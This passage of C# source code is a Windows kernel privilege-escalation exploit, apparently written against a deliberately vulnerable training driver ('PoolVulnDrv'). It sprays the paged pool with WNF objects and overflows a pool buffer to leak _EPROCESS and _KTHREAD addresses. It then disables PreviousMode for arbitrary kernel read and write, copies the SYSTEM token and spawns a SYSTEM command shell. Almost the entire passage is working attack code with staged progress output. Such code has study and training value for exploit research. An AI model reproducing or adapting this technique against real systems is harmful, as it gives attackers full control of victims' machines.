                            targetNameInstance = nameInstance;
                            break;
                        }
                    }
                }

                IoctlFreeObject(hDevice);
                success = IsKernelAddress(pEprocess);

                if (success)
                    break;
            }

            Marshal.FreeHGlobal(pLeakData);
            Marshal.FreeHGlobal(pOverflowInput);

            return success;
        }


        static IntPtr LeakKthreadAddress(
            IntPtr pEprocess,
            ulong corruptedStateName,
            WNF_NAME_INSTANCE nameInstance)
        {
            IntPtr pKthread;
            ulong stateNameForPrimitive = nameInstance.StateName ^ WNF_STATE_KEY;
            int nOffsetNameInstance = 0xA0 + 0x10;
            int nSizeBuffer = nOffsetNameInstance + Marshal.SizeOf(typeof(WNF_NAME_INSTANCE));
            IntPtr inputData = Marshal.AllocHGlobal(nSizeBuffer);
            IntPtr pNameInstance = new IntPtr(inputData.ToInt64() + nOffsetNameInstance);
            uint nSizeMaximum = 0;

            nameInstance.StateData = new IntPtr(pEprocess.ToInt64() + g_OffsetPcb + g_OffsetThreadListHead - 8);
            Marshal.StructureToPtr(nameInstance, pNameInstance, false);

            NtUpdateWnfStateData(
                in corruptedStateName,
                inputData,
                (uint)nSizeBuffer,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);
            Marshal.FreeHGlobal(inputData);

            NtQueryWnfStateData(
                in stateNameForPrimitive,
                IntPtr.Zero,
                IntPtr.Zero,
                out uint nChangeStamp,
                IntPtr.Zero,
                ref nSizeMaximum);
            pKthread = new IntPtr((((long)nChangeStamp << 32) | (long)nSizeMaximum) - g_OffsetThreadListEntry);

            return pKthread;
        }


        static IntPtr ReadPointer(IntPtr address)
        {
            int ntstatus;
            IntPtr result;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);

            ntstatus = NtReadVirtualMemory(
                new IntPtr(-1),
                address,
                buffer,
                (uint)IntPtr.Size,
                IntPtr.Zero);
            result = Marshal.ReadIntPtr(buffer);
            Marshal.FreeHGlobal(buffer);

            if (ntstatus == STATUS_SUCCESS)
                return result;
            else
                return IntPtr.Zero;
        }


        static bool SetPreviousModeSwitch(
            IntPtr pKthread,
            ulong corruptedStateName,
            WNF_NAME_INSTANCE nameInstance)
        {
            int ntstatus;
            int nOffsetNameInstance = 0xA0 + 0x10;
            int nSizeBuffer = nOffsetNameInstance + Marshal.SizeOf(typeof(WNF_NAME_INSTANCE));
            IntPtr inputData = Marshal.AllocHGlobal(nSizeBuffer);
            IntPtr pNameInstance = new IntPtr(inputData.ToInt64() + nOffsetNameInstance);

            nameInstance.StateData = new IntPtr(pKthread.ToInt64() + g_OffsetPreviousMode - 0x12);
            Marshal.StructureToPtr(nameInstance, pNameInstance, false);

            ntstatus = NtUpdateWnfStateData(
                in corruptedStateName,
                inputData,
                (uint)nSizeBuffer,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);
            Marshal.FreeHGlobal(inputData);

            return (ntstatus == STATUS_SUCCESS);
        }


        static bool SwitchPreviousMode(
            WNF_NAME_INSTANCE nameInstance,
            bool enable)
        {
            int ntstatus;
            ulong stateNameForPrimitive = nameInstance.StateName ^ WNF_STATE_KEY;
            byte[] value = enable ? new byte[3] { 0, 0, 1 } : new byte[3] { 0, 0, 0 };
            uint nSizeBuffer = 3;
            IntPtr buffer = Marshal.AllocHGlobal((int)nSizeBuffer);
            Marshal.Copy(value, 0, buffer, value.Length);

            ntstatus = NtUpdateWnfStateData(
                in stateNameForPrimitive,
                buffer,
                nSizeBuffer,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                0);
            Marshal.FreeHGlobal(buffer);

            return (ntstatus == STATUS_SUCCESS);
        }


        static bool SpawnShell()
        {
            bool status;
            var startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);

            Console.WriteLine("[>] Spawning SYSTEM shell.");

            status = CreateProcess(
                null,
                @"C:\Windows\System32\cmd.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,
                IntPtr.Zero,
                Environment.CurrentDirectory,
                ref startupInfo,
                out PROCESS_INFORMATION processInfo);

            if (status)
            {
                Console.WriteLine("[+] Got SYSTEM shell.");
                WaitForSingleObject(processInfo.hProcess, -1);
                return true;
            }
            else
            {
                Console.WriteLine("[-] Failed to spawn shell.");
                return false;
            }
        }


        static void SprayWnfObject()
        {
            IntPtr pSecurityDescriptor;
            var inputData = Encoding.ASCII.GetBytes(new string('A', 0xA0));

            Console.WriteLine("[>] Spraying paged pool with WNF objects.");

            pSecurityDescriptor = GetWorldGenericAllSecurityDescriptor();

            if (pSecurityDescriptor == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get security descriptor.");

                return;
            }

            for (var count = 0; count < g_StateNames.Length; count++)
                g_StateNames[count] = AllocateWnfNameInstance(pSecurityDescriptor);

            for (var count = 1; count < g_StateNames.Length; count += 2)
            {
                if (FreeWnfNameInstance(g_StateNames[count]))
                    g_StateNames[count] = 0UL;

                AllocateWnfStateData(g_StateNames[count - 1], inputData);
            }

            for (var count = 0; count < g_StateNames.Length; count += 4)
            {
                FreeWnfStateData(g_StateNames[count]);

                if (FreeWnfNameInstance(g_StateNames[count]))
                    g_StateNames[count] = 0UL;
            }

            Marshal.FreeHGlobal(pSecurityDescriptor);

            Console.WriteLine("[*] Pool Spraying is compreleted.");
        }


        static bool StealToken(IntPtr pEprocess)
        {
            IntPtr token;
            IntPtr activeProcessLinks;
            IntPtr uniqueProcessId;
            IntPtr pTargetEprocess = pEprocess;
            bool status = false;
            IntPtr currentPid = ReadPointer(new IntPtr(pEprocess.ToInt64() + g_OffsetUniqueProcessId));

            do
            {
                activeProcessLinks = ReadPointer(new IntPtr(pTargetEprocess.ToInt64() + g_ActiveProcessLinks));

                if (!IsKernelAddress(activeProcessLinks))
                    break;

                pTargetEprocess = new IntPtr(activeProcessLinks.ToInt64() - g_ActiveProcessLinks);
                uniqueProcessId = ReadPointer(new IntPtr(pTargetEprocess.ToInt64() + g_OffsetUniqueProcessId));

                if (uniqueProcessId.ToInt64() == 4L)
                {
                    token = ReadPointer(new IntPtr(pTargetEprocess.ToInt64() + g_OffsetToken));
                    status = WritePointer(new IntPtr(pEprocess.ToInt64() + g_OffsetToken), token);
                    break;
                }

                if (uniqueProcessId == currentPid)
                    break;
            } while (true);

            return status;
        }


        static bool WritePointer(IntPtr address, IntPtr pointer)
        {
            int ntstatus;
            IntPtr buffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(buffer, pointer);

            ntstatus = NtWriteVirtualMemory(
                new IntPtr(-1),
                address,
                buffer,
                (uint)IntPtr.Size,
                IntPtr.Zero);
            Marshal.FreeHGlobal(buffer);

            return (ntstatus == STATUS_SUCCESS);
        }


        static void Main()
        {
            int error;
            bool success;
            ulong stateNameForPrimitive;
            IntPtr pKthread;
            bool existWnfObject = false;
            string devicePath = "\\??\\PoolVulnDrv";

            if (!CheckTargetVersion())
                return;

            IntPtr hDevice = GetDeviceHandle(devicePath);

            if (hDevice == INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open {0} (error = {1}).", devicePath, error);

                return;
            }

            do
            {
                /*
                 * Stage 1: Pool Spray
                 */
                SprayWnfObject();

                /*
                 * Stage 2: Pool Overflow and Relative Arbitrary Read
                 */
                Console.WriteLine("[>] Triggering pool overflow and trying to leak kernel data.");

                success = LeakKernelData(
                    hDevice,
                    out IntPtr pEprocess,
                    out ulong corruptedStateName,
                    out WNF_NAME_INSTANCE targetNameInstance);

                if (success)
                {
                    stateNameForPrimitive = targetNameInstance.StateName ^ WNF_STATE_KEY;

                    Console.WriteLine("[+] Succeeded in leaking kernel data.");
                    Console.WriteLine("    |-> nt!_EPROCESS for this Process = 0x{0}", pEprocess.ToString("X16"));
                    Console.WriteLine("    |-> Corrupted WNF State Name      = 0x{0}", corruptedStateName.ToString("X16"));
                    Console.WriteLine("    |-> WNF State Name for primitive  = 0x{0}", stateNameForPrimitive.ToString("X16"));
                    Console.WriteLine("        |-> State Data @ 0x{0}", targetNameInstance.StateData.ToString("X16"));
                }
                else
                {
                    Console.WriteLine("    [-] Failed to leak kernel data.");
                    break;
                }

                for (var idx = 0; idx < g_StateNames.Length; idx++)
                {
                    if (g_StateNames[idx] == stateNameForPrimitive)
                    {
                        existWnfObject = true;
                        break;
                    }
                }

                if (!existWnfObject)
                {
                    Console.WriteLine("[-] WNF State Name for primitive has been deleted.");
                    break;
                }

                /*
                 * Stage 3: Leak nt!_KTHREAD
                 */
                Console.WriteLine("[>] Leaking nt!_KTHREAD for this process.");
                pKthread = LeakKthreadAddress(pEprocess, corruptedStateName, targetNameInstance);

                if (IsKernelAddress(pKthread))
                {
                    Console.WriteLine("[+] Got the address of nt!_KTHREAD.");
                    Console.WriteLine("    |-> nt!_KTHREAD for this process = 0x{0}", pKthread.ToString("X16"));
                }
                else
                {
                    Console.WriteLine("[-] Failed to leak the address of nt!_KTHREAD.");
                    break;
                }

                /*
                 * Stage 4: Disable nt!_KTHREAD.PreviousMode
                 */
                Console.WriteLine("[>] Trying to disable nt!_KTHREAD.PreviousMode.");
                bool status = SetPreviousModeSwitch(
                    pKthread,
                    corruptedStateName,
                    targetNameInstance);

                if (!status)
                {
                    Console.WriteLine("[-] Failed to create nt!_KTHREAD.PreviousMode switch.");
                    break;
                }

                status = SwitchPreviousMode(targetNameInstance, false);

                if (status)
                {
                    Console.WriteLine("[+] nt!_KTHREAD.PreviousMode is disabled successfully.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to disable nt!_KTHREAD.PreviousMode.");
                    break;
                }

                /*
                 * Stage 5: Token Stealing
                 */
                Console.WriteLine("[>] Stealing SYSTEM token.");
                status = StealToken(pEprocess);

                if (status)
                    Console.WriteLine("[+] Token Stealing is successful.");
                else
                    Console.WriteLine("[-] Failed to token stealing.");

                /*
                 * Stage 6: Revert nt!_KTHREAD.PreviousMode to spawn usermode process
                 */
                Console.WriteLine("[>] Reverting nt!_KTHREAD.PreviousMode.");
                status = SwitchPreviousMode(targetNameInstance, true);

                if (status)
                {
                    Console.WriteLine("[+] nt!_KTHREAD.PreviousMode is enabled successfully.");
                }
                else
                {
                    Console.WriteLine("[-] Failed to enable nt!_KTHREAD.PreviousMode.");
                    break;
                }

                /*
                 * Stage 7: Spawn SYSTEM shell
                 */
                SpawnShell();
            } while (false);

            CloseHandle(hDevice);
        }
    }
}
